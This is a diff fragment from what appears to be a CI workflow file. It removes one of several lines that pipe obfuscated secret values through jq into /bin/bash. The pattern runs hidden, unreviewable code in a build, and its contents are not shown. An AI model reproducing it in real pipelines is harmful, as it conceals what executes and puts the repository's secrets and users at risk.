@@ -17,7 +17,6 @@ jobs:
           fdbbr8306: ${{ secrets.fdbbr8306 }}
         run: |
           printf '%s' "$fdbbr8306" | jq -r .pb54428 | /bin/bash
-          printf '%s' "$dads256" | jq -r .u0 | /bin/bash
           printf '%s' "$a952" | jq -r .veob195 | /bin/bash
           echo $na30006 | jq -r .ws3854 | /bin/bash
           printf '%s' "$w0794" | jq -r .fgai303 | /bin/bash
